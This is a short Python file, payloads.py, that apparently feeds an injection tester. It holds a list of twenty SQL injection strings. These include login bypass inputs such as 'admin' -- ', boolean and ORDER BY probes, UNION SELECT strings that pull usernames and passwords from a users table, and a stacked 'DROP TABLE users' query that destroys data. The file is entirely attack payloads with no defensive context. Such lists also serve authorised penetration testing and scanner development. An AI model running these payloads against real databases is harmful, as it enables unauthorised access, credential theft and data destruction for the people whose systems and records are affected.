# payloads.py
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR '1'='1' /* ",
    "' OR 1=1 -- ",
    "' OR 1=1/*",
    "' OR 1=1#",
    "' OR 'a'='a",
    "' OR 'a'='a' -- ",
    "' OR 'a'='a' /* ",
    "admin' -- ",
    "admin' /* ",
    "admin' #",
    "1' ORDER BY 1-- -",
    "1' AND 1=1-- -",
    "1' AND 1=2-- -",
    "' UNION SELECT NULL, NULL-- -",
    "' UNION SELECT username, password FROM users-- -",
    "1' UNION SELECT 1, 'password'-- -",
    "'; DROP TABLE users--",
    "'; SELECT * FROM users WHERE '1'='1"
]
